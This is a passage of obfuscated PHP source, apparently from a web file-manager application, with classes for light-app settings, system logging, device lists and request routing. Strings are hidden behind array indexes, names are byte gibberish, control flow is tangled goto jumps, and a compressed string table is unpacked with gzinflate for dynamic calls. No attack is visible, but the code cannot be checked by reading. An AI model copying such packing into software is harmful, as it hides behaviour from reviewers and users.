{ return; } $cõƒ‘Ï”§ = array_to_keyvalue($eÛŒ‚Ìœà, $fèÑÍÁÛÑÁ[33], $fèÑÍÁÛÑÁ[441]); goto e­Í‚Ë¶ñË; b›„İ‹šğ: $fèÑÍÁÛÑÁ =& $_SERVER[“]; $C›ºÁ™Šé = "\x7b\x69\157\72{$Eà­…†¹ÙØ}\175\x2f"; $b²ÚÂñéÀó = array($fèÑÍÁÛÑÁ[369] => 0, $fèÑÍÁÛÑÁ[1006] => array($fèÑÍÁÛÑÁ[735], "{$C›ºÁ™Šé}\45")); goto E•Ëñ‘Æ£; Aù±ºÑÔêÇ: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\114\151\147\x68\x74\x41\x70\160"; public $modelType = "\123\171\163\164\x65\155\x4f\160\x74\x69\x6f\x6e"; public $field = array("\156\141\x6d\145", "\147\162\x6f\x75\160", "\x64\x65\x73\x63", "\143\x6f\156\x74\x65\x6e\x74"); public function listData($E½–«‡Ä“­ = false, $FĞó‚Ö»â‚ = "\155\x6f\144\x69\x66\x79\x54\x69\155\145", $aÈÎ™îË²Î = true) { return parent::listData($E½–«‡Ä“­, $FĞó‚Ö»â‚, $aÈÎ™îË²Î); } public function remove($A†Ã«•ÚŠ) { $E«ğ£¤Æë = $this->findByName($A†Ã«•ÚŠ); if (!$E«ğ£¤Æë) { return !1; } return parent::remove($E«ğ£¤Æë[$_SERVER[“][367]]); } public function add($f¢ßï´Ê¶) { if ($this->findByName($f¢ßï´Ê¶[$_SERVER[“][28]])) { return !1; } return parent::insert($f¢ßï´Ê¶); } public function update($eÁÕ¼ÜÔ¼, $Cç›±™øïÄ) { $cŒäå…ƒ•  =& $_SERVER[“]; $b¿âÂ’ºÀ = $this->findByName($eÁÕ¼ÜÔ¼); $F™ğèŠø§› = $this->findByName($Cç›±™øïÄ[$cŒäå…ƒ• [28]]); if (!$b¿âÂ’ºÀ || $F™ğèŠø§› && $F™ğèŠø§›[$cŒäå…ƒ• [367]] != $b¿âÂ’ºÀ[$cŒäå…ƒ• [367]]) { return !1; } return parent::update($b¿âÂ’ºÀ[$cŒäå…ƒ• [367]], $Cç›±™øïÄ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\155\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\143\162\x65\x61\164\145\x54\151\x6d\x65", "\x74\151\155\x65", "\151\x6e\163\x65\x72\x74", "\146\165\156\143\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $Fªá¤İõÄö =& $_SERVER[“]; return array($Fªá¤İõÄö[2388] => LNG($Fªá¤İõÄö[2389]), $Fªá¤İõÄö[2390] => LNG($Fªá¤İõÄö[2391]), $Fªá¤İõÄö[2034] => LNG($Fªá¤İõÄö[2392]), $Fªá¤İõÄö[2393] => LNG($Fªá¤İõÄö[2394]), $Fªá¤İõÄö[2395] => LNG($Fªá¤İõÄö[2396]), $Fªá¤İõÄö[2397] => LNG($Fªá¤İõÄö[2398]), $Fªá¤İõÄö[2399] => LNG($Fªá¤İõÄö[2400]), $Fªá¤İõÄö[2401] => LNG($Fªá¤İõÄö[2402]), $Fªá¤İõÄö[2065] => LNG($Fªá¤İõÄö[2403]), $Fªá¤İõÄö[2066] => LNG($Fªá¤İõÄö[2404]), $Fªá¤İõÄö[2405] => LNG($Fªá¤İõÄö[2406]), $Fªá¤İõÄö[2407] => LNG($Fªá¤İõÄö[2408]), $Fªá¤İõÄö[2409] => LNG($Fªá¤İõÄö[2410]), $Fªá¤İõÄö[2411] => LNG($Fªá¤İõÄö[2412]), $Fªá¤İõÄö[2063] => LNG($Fªá¤İõÄö[2413]), $Fªá¤İõÄö[2070] => LNG($Fªá¤İõÄö[2414]), $Fªá¤İõÄö[2415] => LNG($Fªá¤İõÄö[2416]), $Fªá¤İõÄö[2417] => LNG($Fªá¤İõÄö[2418]), $Fªá¤İõÄö[2419] => LNG($Fªá¤İõÄö[2420]), $Fªá¤İõÄö[2421] => LNG($Fªá¤İõÄö[2422]), $Fªá¤İõÄö[2073] => LNG($Fªá¤İõÄö[2423]), $Fªá¤İõÄö[2074] => LNG($Fªá¤İõÄö[2424]), $Fªá¤İõÄö[2425] => LNG($Fªá¤İõÄö[2426]), $Fªá¤İõÄö[2427] => LNG($Fªá¤İõÄö[2428]), $Fªá¤İõÄö[2429] => LNG($Fªá¤İõÄö[2430]), $Fªá¤İõÄö[2068] => LNG($Fªá¤İõÄö[2431]), $Fªá¤İõÄö[2432] => LNG($Fªá¤İõÄö[2433]), $Fªá¤İõÄö[2067] => LNG($Fªá¤İõÄö[2434]), $Fªá¤İõÄö[2435] => LNG($Fªá¤İõÄö[2436]), $Fªá¤İõÄö[2437] => LNG($Fªá¤İõÄö[2438]), $Fªá¤İõÄö[2439] => LNG($Fªá¤İõÄö[2439]), $Fªá¤İõÄö[2440] => LNG($Fªá¤İõÄö[2038]), $Fªá¤İõÄö[2441] => LNG($Fªá¤İõÄö[2442]), $Fªá¤İõÄö[2443] => LNG($Fªá¤İõÄö[2444]), $Fªá¤İõÄö[2445] => LNG($Fªá¤İõÄö[2446]), $Fªá¤İõÄö[2447] => LNG($Fªá¤İõÄö[2448]), $Fªá¤İõÄö[2449] => LNG($Fªá¤İõÄö[2450]), $Fªá¤İõÄö[2451] => LNG($Fªá¤İõÄö[2451]), $Fªá¤İõÄö[2452] => LNG($Fªá¤İõÄö[2453]), $Fªá¤İõÄö[2454] => LNG($Fªá¤İõÄö[2455]), $Fªá¤İõÄö[2456] => LNG($Fªá¤İõÄö[2457]), $Fªá¤İõÄö[2458] => LNG($Fªá¤İõÄö[2459]), $Fªá¤İõÄö[2460] => LNG($Fªá¤İõÄö[2461]), $Fªá¤İõÄö[2462] => LNG($Fªá¤İõÄö[2463])); } private function typeFile() { $c‡öŞŠ =& $_SERVER[“]; $dÛêà‰„´ = array($c‡öŞŠ[2070] => array($c‡öŞŠ[2071]), $c‡öŞŠ[2409] => array($c‡öŞŠ[2464]), $c‡öŞŠ[2411] => array($c‡öŞŠ[2465]), $c‡öŞŠ[2063] => array($c‡öŞŠ[2064]), $c‡öŞŠ[2417] => array(), $c‡öŞŠ[2419] => array(), $c‡öŞŠ[2421] => array(), $c‡öŞŠ[2073] => array($c‡öŞŠ[2075]), $c‡öŞŠ[2074] => array($c‡öŞŠ[2075]), $c‡öŞŠ[2425] => array($c‡öŞŠ[2466]), $c‡öŞŠ[2427] => array($c‡öŞŠ[2466]), $c‡öŞŠ[2429] => array($c‡öŞŠ[2467]), $c‡öŞŠ[2415] => array($c‡öŞŠ[2468]), $c‡öŞŠ[2068] => array($c‡öŞŠ[2469]), $c‡öŞŠ[2432] => array($c‡öŞŠ[2470]), $c‡öŞŠ[2067] => array($c‡öŞŠ[2069])); return $dÛêà‰„´; } private function typeAll() { goto f‰Ğ‡æÁÒò; f†ÚğŞÈ»¬: return $BÓ«æãİÔ; goto E÷ËóÇ±ƒš; F£äÅ‘ˆçÉ: foreach ($Fš‰¸êì°’ as $E‹¼ÏĞñ™º => $fÌ¬”ˆÓç) { $BÓ«æãİÔ[$fÌ¬”ˆÓç[0]] = $BÓ«æãİÔ[$E‹¼ÏĞñ™º]; } $BÓ«æãİÔ[$däŒÈ¦çÒ‹[2075]] = LNG($däŒÈ¦çÒ‹[2471]); $BÓ«æãİÔ[$däŒÈ¦çÒ‹[2466]] = LNG($däŒÈ¦çÒ‹[2472]); goto f†ÚğŞÈ»¬; f‰Ğ‡æÁÒò: $däŒÈ¦çÒ‹ =& $_SERVER[“]; $BÓ«æãİÔ = $this->typeList; $Fš‰¸êì°’ = array_filter($this->typeFile()); goto F£äÅ‘ˆçÉ; E÷ËóÇ±ƒš: } public function addLog($cÊËåªæ™, $b¥‘¡í¶­¡ = array()) { goto A‹´Áøª; a¯âñ†µ©: parent::add($b¥‘¡í¶­¡); goto aÒŒˆöñ¶Ó; A‹´Áøª: $D¾«‘„ÚÃ =& $_SERVER[“]; if (!isset($this->typeList[$cÊËåªæ™])) { return; } $B¬¨„Üøöî = USER_ID ? USER_ID : (isset($b¥‘¡í¶­¡[$D¾«‘„ÚÃ[1423]]) ? $b¥‘¡í¶­¡[$D¾«‘„ÚÃ[1423]] : 0); goto B£‹¡ŞŞéâ; B£‹¡ŞŞéâ: $CÇÄ’Õè­ = get_client_ip(); if (!$b¥‘¡í¶­¡ || strlen(json_encode($b¥‘¡í¶­¡)) >= 1024) { $b¥‘¡í¶­¡ = array($D¾«‘„ÚÃ[2473] => $CÇÄ’Õè­); } else { if (is_array($b¥‘¡í¶­¡)) { $b¥‘¡í¶­¡[$D¾«‘„ÚÃ[2473]] = $CÇÄ’Õè­; } else { $b¥‘¡í¶­¡ = array($D¾«‘„ÚÃ[1021] => $b¥‘¡í¶­¡, $D¾«‘„ÚÃ[2473] => $CÇÄ’Õè­); } } $b¥‘¡í¶­¡ = array($D¾«‘„ÚÃ[1412] => Session::sign(), $D¾«‘„ÚÃ[1413] => $B¬¨„Üøöî, $D¾«‘„ÚÃ[29] => $cÊËåªæ™, $D¾«‘„ÚÃ[1415] => json_encode($b¥‘¡í¶­¡)); goto a¯âñ†µ©; aÒŒˆöñ¶Ó: } public function remove($dÍ‹¸ò¿õ£) { $this->where(array($_SERVER[“][385] => $dÍ‹¸ò¿õ£))->delete(); } private function _makeOrder($B½µ„ÀÙÖ = '') { goto a¼·¬©¯å; F½ª–‰„Ş: $Dšî¬ºŞ‡º = Input::get($c¦¡İ¿ÑÖ[408], $c¦¡İ¿ÑÖ[7], $c¦¡İ¿ÑÖ[2249], array($c¦¡İ¿ÑÖ[2175], $c¦¡İ¿ÑÖ[404])); $Dšî¬ºŞ‡º = $Dà•¡ë¿È[$Dšî¬ºŞ‡º]; $B½µ„ÀÙÖ = $B½µ„ÀÙÖ . "{$a‚ñ¹ê”}\40{$Dšî¬ºŞ‡º}"; goto bÀ£‚¼»²æ; bÀ£‚¼»²æ: return $this->order($B½µ„ÀÙÖ); goto f÷ÇÂô; a¼·¬©¯å: $c¦¡İ¿ÑÖ =& $_SERVER[“]; $a‚ñ¹ê” = $c¦¡İ¿ÑÖ[187]; $Dà•¡ë¿È = array($c¦¡İ¿ÑÖ[402] => $c¦¡İ¿ÑÖ[403], $c¦¡İ¿ÑÖ[404] => $c¦¡İ¿ÑÖ[405]); goto F½ª–‰„Ş; f÷ÇÂô: } public function get($D»ã…¡‡ñ = '') { goto EŞ¥İ§Ï; a¨®ÂÕ”É: if (!empty($D»ã…¡‡ñ[$aï‘‚åàÊ[2473]])) { $Ağ¨ç¤Ç‚[$aï‘‚åàÊ[405]] = array($aï‘‚åàÊ[735], "\x25{$D»ã…¡‡ñ[$aï‘‚åàÊ[2473]]}\x25"); } $dèóôäª = $this->_makeOrder()->where($Ağ¨ç¤Ç‚)->selectPage(); if (empty($dèóôäª[$aï‘‚åàÊ[354]])) { show_json(array(), !0, $dèóôäª[$aï‘‚åàÊ[351]]); } goto D¢ç¼·ÔÙ; D¢ç¼·ÔÙ: $dèóôäª[$aï‘‚åàÊ[354]] = $this->logList($dèóôäª[$aï‘‚åàÊ[354]]); return $dèóôäª; goto D“ÃÊ•„¨­; EŞ¥İ§Ï: $aï‘‚åàÊ =& $_SERVER[“]; if (!$D»ã…¡‡ñ) { show_json(array()); } $Ağ¨ç¤Ç‚ = array(); goto AÜ¥–¥ôæá; AÜ¥–¥ôæá: if ($D»ã…¡‡ñ[$aï‘‚åàÊ[1423]]) { $Ağ¨ç¤Ç‚[$aï‘‚åàÊ[1423]] = $D»ã…¡‡ñ[$aï‘‚åàÊ[1423]]; } if (isset($D»ã…¡‡ñ[$aï‘‚åàÊ[686]])) { $bù¨¾ë„‹ñ = $D»ã…¡‡ñ[$aï‘‚åàÊ[686]]; $A¥´‹ØÒ³× = isset($D»ã…¡‡ñ[$aï‘‚åàÊ[449]]) ? $D»ã…¡‡ñ[$aï‘‚åàÊ[449]] : time(); $Ağ¨ç¤Ç‚[$aï‘‚åàÊ[187]] = array($aï‘‚åàÊ[321], array($bù¨¾ë„‹ñ, $A¥´‹ØÒ³×)); } if ($D»ã…¡‡ñ[$aï‘‚åàÊ[29]]) { $a¨½»ªÙó = explode($aï‘‚åàÊ[47], $D»ã…¡‡ñ[$aï‘‚åàÊ[29]]); $e‚ÔÙ™æÍ† = $this->typeFile(); $Eö³œæÇğ = array(); foreach ($a¨½»ªÙó as $eˆµŸóå¡) { $Eö³œæÇğ[] = $eˆµŸóå¡; if (isset($e‚ÔÙ™æÍ†[$eˆµŸóå¡])) { $Eö³œæÇğ = array_merge($Eö³œæÇğ, $e‚ÔÙ™æÍ†[$eˆµŸóå¡]); } } $Eö³œæÇğ = array_unique($Eö³œæÇğ); if ($Eö³œæÇğ) { $Ağ¨ç¤Ç‚[$aï‘‚åàÊ[29]] = array($aï‘‚åàÊ[7], $Eö³œæÇğ); } } goto a¨®ÂÕ”É; D“ÃÊ•„¨­: } private function ipAddress(&$d²Ñ¢ö¡‰é) { $d¬­‹Â¹Ÿä =& $_SERVER[“]; if (!empty($d²Ñ¢ö¡‰é[$d¬­‹Â¹Ÿä[2473]])) { $dÛÙ¤–ŠôŠ = IpLocation::get($d²Ñ¢ö¡‰é[$d¬­‹Â¹Ÿä[2473]]); } else { $dÛÙ¤–ŠôŠ = LNG($d¬­‹Â¹Ÿä[2474]); } $d²Ñ¢ö¡‰é[$d¬­‹Â¹Ÿä[2475]] = $dÛÙ¤–ŠôŠ; } private function descZipDownload($D‰ù¥˜‹Ëç, &$cÂ…¾æ“Ÿæ) { $CÀñö¿Ø¡ =& $_SERVER[“]; if (!isset($D‰ù¥˜‹Ëç[$CÀñö¿Ø¡[2476]])) { return; } $Fì  §†ª² = json_decode($D‰ù¥˜‹Ëç[$CÀñö¿Ø¡[2476]], !0); foreach ($Fì  §†ª² as $A ò‘†ø÷) { if (!IO::init($A ò‘†ø÷[$CÀñö¿Ø¡[75]])) { continue; } if (!($b”öñÉø± = IO::infoFull($A ò‘†ø÷[$CÀñö¿Ø¡[75]]))) { continue; } $D‰ù¥˜‹Ëç[$CÀñö¿Ø¡[75]] = $A ò‘†ø÷[$CÀñö¿Ø¡[75]]; $cÂ…¾æ“Ÿæ[] = $D‰ù¥˜‹Ëç[$CÀñö¿Ø¡[369]] = $b”öñÉø±[$CÀñö¿Ø¡[369]]; $cÂ…¾æ“Ÿæ[] = $D‰ù¥˜‹Ëç[$CÀñö¿Ø¡[2292]] = $b”öñÉø±[$CÀñö¿Ø¡[463]]; break; } return $D‰ù¥˜‹Ëç; } private function getSourceList(&$fæà‡ò£) { $Dº¯¯¦‡ĞÓ =& $_SERVER[“]; $AåâŒÃŸÓÖ = array(); foreach ($fæà‡ò£ as $E´¦Í ªë² => $càÙè»óŞŒ) { goto b…ö÷ëĞã; aÔÚÈ¢»ÛÜ: $AåâŒÃŸÓÖ[] = $b»ïõŸÕã[$Dº¯¯¦‡ĞÓ[369]]; $AåâŒÃŸÓÖ[] = $b»ïõŸÕã[$Dº¯¯¦‡ĞÓ[2292]]; if ($b»ïõŸÕã[$Dº¯¯¦‡ĞÓ[29]] == $Dº¯¯¦‡ĞÓ[494]) { $AåâŒÃŸÓÖ[] = $b»ïõŸÕã[$Dº¯¯¦‡ĞÓ[405]][$Dº¯¯¦‡ĞÓ[994]]; $AåâŒÃŸÓÖ[] = $b»ïõŸÕã[$Dº¯¯¦‡ĞÓ[405]][$Dº¯¯¦‡ĞÓ[995]]; } goto aÉÔÏ­Œê¿; b…ö÷ëĞã: $b»ïõŸÕã = json_decode($càÙè»óŞŒ[$Dº¯¯¦‡ĞÓ[405]], !0); if ($càÙè»óŞŒ[$Dº¯¯¦‡ĞÓ[29]] == $Dº¯¯¦‡ĞÓ[2066]) { $b»ïõŸÕã = $this->descZipDownload($b»ïõŸÕã, $AåâŒÃŸÓÖ); $fæà‡ò£[$E´¦Í ªë²][$Dº¯¯¦‡ĞÓ[405]] = json_encode($b»ïõŸÕã); continue; } if (strpos($càÙè»óŞŒ[$Dº¯¯¦‡ĞÓ[29]], $Dº¯¯¦‡ĞÓ[2293]) !== 0) { goto eâë•—‹; AÃ²‚œ¡è´: $AåâŒÃŸÓÖ[] = $b»ïõŸÕã[$Dº¯¯¦‡ĞÓ[369]] = $Cêš°âÚóÈ[$Dº¯¯¦‡ĞÓ[369]]; $AåâŒÃŸÓÖ[] = $b»ïõŸÕã[$Dº¯¯¦‡ĞÓ[2292]] = $Cêš°âÚóÈ[$Dº¯¯¦‡ĞÓ[463]]; $fæà‡ò£[$E´¦Í ªë²][$Dº¯¯¦‡ĞÓ[405]] = json_encode($b»ïõŸÕã); goto aä‚‡”ÆßË; eâë•—‹: if (!isset($b»ïõŸÕã[$Dº¯¯¦‡ĞÓ[75]]) || strpos($càÙè»óŞŒ[$Dº¯¯¦‡ĞÓ[29]], $Dº¯¯¦‡ĞÓ[2477]) !== 0) { continue; } if (!IO::init($b»ïõŸÕã[$Dº¯¯¦‡ĞÓ[75]])) { continue; } if (!($Cêš°âÚóÈ = IO::infoFull($b»ïõŸÕã[$Dº¯¯¦‡ĞÓ[75]]))) { continue; } goto AÃ²‚œ¡è´; aä‚‡”ÆßË: continue; goto eãß®’‘Î»; eãß®’‘Î»: } goto aÔÚÈ¢»ÛÜ; aÉÔÏ­Œê¿: if ($b»ïõŸÕã[$Dº¯¯¦‡ĞÓ[29]] == $Dº¯¯¦‡ĞÓ[2300]) { $AåâŒÃŸÓÖ[] = $b»ïõŸÕã[$Dº¯¯¦‡ĞÓ[405]][$Dº¯¯¦‡ĞÓ[369]]; } goto cÌ„¿†·¦§; cÌ„¿†·¦§: } if (!$AåâŒÃŸÓÖ) { return array(); } return Model($Dº¯¯¦‡ĞÓ[736])->sourceListInfo($AåâŒÃŸÓÖ, !0); } private function logList($dâÍÕìÕˆ„) { goto FÉñÊáÚ½; FÉñÊáÚ½: $e™š½‘­×ä =& $_SERVER[“]; $FÓ‰ø¶‹« = array_to_keyvalue($dâÍÕìÕˆ„, $e™š½‘­×ä[33], $e™š½‘­×ä[1423]); $Cìó‰Â×¥Î = Model($e™š½‘­×ä[479])->userListInfo(array_unique($FÓ‰ø¶‹«)); goto bâù…Êà‹; F÷Íƒ÷ã‰: return $fÀŒÒ¾—©Š; goto fƒÖ¼¦ªè; CË¾Î­º»î: $bõİÌæç‘ = array(); foreach ($dâÍÕìÕˆ„ as $b°ˆ¾¤­ë· => $BÌ‚¾‡‡ÏĞ) { goto B›„ŠÜÓå; B›„ŠÜÓå: $bâ£À«„ê¨ = $BÌ‚¾‡‡ÏĞ[$e™š½‘­×ä[29]]; $eÛÇ²É®»Ì = isset($Cìó‰Â×¥Î[$BÌ‚¾‡‡ÏĞ[$e™š½‘­×ä[1423]]]) ? $Cìó‰Â×¥Î[$BÌ‚¾‡‡ÏĞ[$e™š½‘­×ä[1423]]] : !1; $A¸ŸèŠÚ¢Ø = strpos($bâ£À«„ê¨, $e™š½‘­×ä[2478]) === 0 ? LNG($e™š½‘­×ä[2479]) : LNG($e™š½‘­×ä[2474]); goto f…ÙèÄŸŠ; fŞ‚ô¢–Ò—: $this->ipAddress($BÌ‚¾‡‡ÏĞ); if (strpos($bâ£À«„ê¨, $e™š½‘­×ä[2293]) === 0 || isset($cËğ„ŒÇ ­[$e™š½‘­×ä[2292]])) { goto b¨áçÏÃêÀ; b¨áçÏÃêÀ: $cËğ„ŒÇ ­[$e™š½‘­×ä[391]] = $E•ó²ë‘ƒ[$cËğ„ŒÇ ­[$e™š½‘­×ä[369]]]; $cËğ„ŒÇ ­[$e™š½‘­×ä[2305]] = $E•ó²ë‘ƒ[$cËğ„ŒÇ ­[$e™š½‘­×ä[2292]]]; if ($cËğ„ŒÇ ­[$e™š½‘­×ä[29]] == $e™š½‘­×ä[494]) { $cËğ„ŒÇ ­[$e™š½‘­×ä[405]][$e™š½‘­×ä[994]] = $E•ó²ë‘ƒ[$cËğ„ŒÇ ­[$e™š½‘­×ä[405]][$e™š½‘­×ä[994]]]; $cËğ„ŒÇ ­[$e™š½‘­×ä[405]][$e™š½‘­×ä[995]] = $E•ó²ë‘ƒ[$cËğ„ŒÇ ­[$e™š½‘­×ä[405]][$e™š½‘­×ä[995]]]; } goto bÀ½œìê¥½; BÊ®‰ô„ç›: if ($cËğ„ŒÇ ­[$e™š½‘­×ä[2305]] && $cËğ„ŒÇ ­[$e™š½‘­×ä[2305]][$e™š½‘­×ä[371]] == $e™š½‘­×ä[1067]) { $bõİÌæç‘[] = $BÌ‚¾‡‡ÏĞ[$e™š½‘­×ä[367]]; unset($dâÍÕìÕˆ„[$b°ˆ¾¤­ë·]); continue; } goto dø±¶Ÿ‰Ü…; bÀ½œìê¥½: if ($cËğ„ŒÇ ­[$e™š½‘­×ä[29]] == $e™š½‘­×ä[2300]) { $cËğ„ŒÇ ­[$e™š½‘­×ä[405]][$e™š½‘­×ä[369]] = $E•ó²ë‘ƒ[$cËğ„ŒÇ ­[$e™š½‘­×ä[405]][$e™š½‘­×ä[369]]]; } if ($cËğ„ŒÇ ­[$e™š½‘­×ä[29]] == $e™š½‘­×ä[2061]) { $cËğ„ŒÇ ­[$e™š½‘­×ä[2305]] = $cËğ„ŒÇ ­[$e™š½‘­×ä[391]]; $cËğ„ŒÇ ­[$e™š½‘­×ä[2292]] = $cËğ„ŒÇ ­[$e™š½‘­×ä[2305]][$e™š½‘­×ä[369]]; $cËğ„ŒÇ ­[$e™š½‘­×ä[391]] = !1; $cËğ„ŒÇ ­[$e™š½‘­×ä[369]] = $e™š½‘­×ä[33]; } if ($cËğ„ŒÇ ­[$e™š½‘­×ä[391]] && $cËğ„ŒÇ ­[$e™š½‘­×ä[391]][$e™š½‘­×ä[371]] == $e™š½‘­×ä[1067]) { $bõİÌæç‘[] = $BÌ‚¾‡‡ÏĞ[$e™š½‘­×ä[367]]; unset($dâÍÕìÕˆ„[$b°ˆ¾¤­ë·]); continue; } goto BÊ®‰ô„ç›; dø±¶Ÿ‰Ü…: } $BÌ‚¾‡‡ÏĞ[$e™š½‘­×ä[405]] = $cËğ„ŒÇ ­; goto DåÄ÷ºíè; DåÄ÷ºíè: unset($BÌ‚¾‡‡ÏĞ[$e™š½‘­×ä[2480]]); $fÀŒÒ¾—©Š[] = $BÌ‚¾‡‡ÏĞ; goto c®­„Ü§â; a„íÀÙâÙ: $BÌ‚¾‡‡ÏĞ[$e™š½‘­×ä[2248]] = $eÛÇ²É®»Ì; $cËğ„ŒÇ ­ = json_decode($BÌ‚¾‡‡ÏĞ[$e™š½‘­×ä[405]], !0); $BÌ‚¾‡‡ÏĞ[$e™š½‘­×ä[2473]] = isset($cËğ„ŒÇ ­[$e™š½‘­×ä[2473]]) ? $cËğ„ŒÇ ­[$e™š½‘­×ä[2473]] : $e™š½‘­×ä[33]; goto fŞ‚ô¢–Ò—; f…ÙèÄŸŠ: $BÌ‚¾‡‡ÏĞ[$e™š½‘­×ä[28]] = isset($eÛÇ²É®»Ì[$e™š½‘­×ä[28]]) ? $eÛÇ²É®»Ì[$e™š½‘­×ä[28]] : LNG($e™š½‘­×ä[2474]); $BÌ‚¾‡‡ÏĞ[$e™š½‘­×ä[2342]] = isset($eÛÇ²É®»Ì[$e™š½‘­×ä[2342]]) ? $eÛÇ²É®»Ì[$e™š½‘­×ä[2342]] : $e™š½‘­×ä[33]; $BÌ‚¾‡‡ÏĞ[$e™š½‘­×ä[1328]] = isset($f‹÷ñË»ò„[$bâ£À«„ê¨]) ? $f‹÷ñË»ò„[$bâ£À«„ê¨] : $A¸ŸèŠÚ¢Ø; goto a„íÀÙâÙ; c®­„Ü§â: } $this->clearSystemPathLog($bõİÌæç‘); goto F÷Íƒ÷ã‰; bâù…Êà‹: $E•ó²ë‘ƒ = $this->getSourceList($dâÍÕìÕˆ„); $f‹÷ñË»ò„ = $this->typeAll(); $fÀŒÒ¾—©Š = array(); goto CË¾Î­º»î; fƒÖ¼¦ªè: } private function clearSystemPathLog($Bæí‹ÎÔ‡ª) { $aŒ„•öõ¸÷ =& $_SERVER[“]; if (count($Bæí‹ÎÔ‡ª) == 0) { return; } $a®¥ÊĞÀ¿ = array($aŒ„•öõ¸÷[367] => array($aŒ„•öõ¸÷[7], array_unique($Bæí‹ÎÔ‡ª))); $this->where($a®¥ÊĞÀ¿)->delete(); } public function deviceList($bÂ èğ†ÌŒ, $d…á„Œ­ŞÖ = 0) { $b¦‹çË¡² =& $_SERVER[“]; $F‘‘İ¶·š = array($b¦‹çË¡²[1423] => $bÂ èğ†ÌŒ, $b¦‹çË¡²[187] => array($b¦‹çË¡²[914], $d…á„Œ­ŞÖ), $b¦‹çË¡²[29] => $b¦‹çË¡²[2034]); $FÃ§ŒİÏì = array(); $eÆÙ£ÌÚÁ¼ = $this->field($b¦‹çË¡²[2481])->where($F‘‘İ¶·š)->order($b¦‹çË¡²[2303])->limit(50)->select(); foreach ($eÆÙ£ÌÚÁ¼ as $fí‹îéƒòÂ => $Cî¾†¯¸šÂ) { goto c‘‰ªˆÌĞÍ; EÇÚ¾’Ì¨: $this->ipAddress($Cî¾†¯¸šÂ); $Cî¾†¯¸šÂ[$b¦‹çË¡²[405]] = $aÆ¢ ò§Ù; $FÃ§ŒİÏì[$EóÖñËµ•¼] = $Cî¾†¯¸šÂ; goto EÇµ×Á¶éã; dº‹ºÛ‹§î: unset($aÆ¢ ò§Ù[$b¦‹çË¡²[2473]]); $EóÖñËµ•¼ = $this->deviceType($aÆ¢ ò§Ù[$b¦‹çË¡²[2294]]); if (isset($FÃ§ŒİÏì[$EóÖñËµ•¼])) { continue; } goto EÇÚ¾’Ì¨; c‘‰ªˆÌĞÍ: if ($fí‹îéƒòÂ > 0 && abs($Cî¾†¯¸šÂ[$b¦‹çË¡²[187]] - $eÆÙ£ÌÚÁ¼[$fí‹îéƒòÂ - 1][$b¦‹çË¡²[187]]) < 5) { continue; } $aÆ¢ ò§Ù = json_decode($Cî¾†¯¸šÂ[$b¦‹çË¡²[405]], !0); $Cî¾†¯¸šÂ[$b¦‹çË¡²[2473]] = isset($aÆ¢ ò§Ù[$b¦‹çË¡²[2473]]) ? $aÆ¢ ò§Ù[$b¦‹çË¡²[2473]] : $b¦‹çË¡²[33]; goto dº‹ºÛ‹§î; EÇµ×Á¶éã: } return array_values($FÃ§ŒİÏì); } public function deviceType($e‹ÇÍç›³°) { return $e‹ÇÍç›³°; } } goto aê¶ÚÁ“á; fµ“Í¶·¯‡: $B¨½²¿”Ø› = $_SERVER[“][549]; $_SERVER[Š°ş®×«Ú] = explode($_SERVER[“][550], gzinflate(substr($_SERVER[“][551], 10, -8))); $DßÓË¹Ì÷˜ = $_SERVER[“][552]; goto A¹§À±Âù; Fàì‚˜»Úª: function beforeShutdown() { Hook::trigger($_SERVER[ğ£][32]); } $_SERVER[$_SERVER[ğ£][33]] = BASIC_PATH; $_SERVER[$_SERVER[ğ£][34]] = LIB_DIR; goto D®òœ’äØœ; A¹§À±Âù: while ($DßÓË¹Ì÷˜ < $_SERVER[“][553]) { if ($DßÓË¹Ì÷˜ >= 0) { break; } $DßÓË¹Ì÷˜++; } class Application { private $defaultModule = "\151\x6e\144\145\170"; private $defaultController = "\151\x6e\x64\145\170"; private $defaultAction = "\151\156\x64\x65\170"; function __construct() { } public function setDefault($cº¡Û‹Ëæ°) { goto Bñ¿ñÕÉ×Î; AÉ»Ë•ğƒÁ: $aè¢Éõ‚µ„ = $BçêÎ’ö£ß[554]; if (strlen($aè¢Éõ‚µ„) < $BçêÎ’ö£ß[553]) { return; } $this->{$_SERVER[Š°ş®×«Ú][3]}($dõœ“³¤Íò[4], array($this, $dõœ“³¤Íò[5])); goto EÏ‡òŒë´; b™Ç…Çõ¡ï: $this->defaultModule = $e‘ï«ƒß¢Ì[0] ? $e‘ï«ƒß¢Ì[0] : $this->defaultModule; $this->defaultController = $e‘ï«ƒß¢Ì[1] ? $e‘ï«ƒß¢Ì[1] : $this->defaultController; $this->defaultAction = $e‘ï«ƒß¢Ì[2] ? $e‘ï«ƒß¢Ì[2] : $this->defaultAction; goto AÉ»Ë•ğƒÁ; Bñ¿ñÕÉ×Î: $BçêÎ’ö£ß =& $_SERVER[“]; $dõœ“³¤Íò =& $_SERVER[Š°ş®×«Ú]; $e‘ï«ƒß¢Ì = $dõœ“³¤Íò[0]($dõœ“³¤Íò[1], $dõœ“³¤Íò[2]($cº¡Û‹Ëæ°, $dõœ“³¤Íò[1])); goto b™Ç…Çõ¡ï; EÏ‡òŒë´: } public function appRun($BÛŒÂĞ¤±ª) { goto eÀ”›©Õï; Bàò‘ Èµ: $D¡à¿»ñ»ö[17]($BÛŒÂĞ¤±ª); $fëµ³àÙäÖ = $_SERVER[“][555]; if (!$fëµ³àÙäÖ) { return; } goto bÆÜ—ÕÅŞ‡; eÀ”›©Õï: $D¡à¿»ñ»ö =& $_SERVER[Š°ş®×«Ú]; $dŒŠ„ë£°Š = $D¡à¿»ñ»ö[0]($D¡à¿»ñ»ö[1], $BÛŒÂĞ¤±ª); $fã–†¾ã½ = $D¡à¿»ñ»ö[6]($dŒŠ„ë£°Š[0]); goto DŒÊÕÒêù; DŒÊÕÒêù: $E™ø‚ÁØÀ = $D¡à¿»ñ»ö[7]; if ($fã–†¾ã½ == $D¡à¿»ñ»ö[8]) { $E™ø‚ÁØÀ = $D¡à¿»ñ»ö[9]; $dŒŠ„ë£°Š[0] = $D¡à¿»ñ»ö[10]; $dŒŠ„ë£°Š[1] = $dŒŠ„ë£°Š[1] . $D¡à¿»ñ»ö[11]; $BÛŒÂĞ¤±ª = $D¡à¿»ñ»ö[12]($D¡à¿»ñ»ö[1], 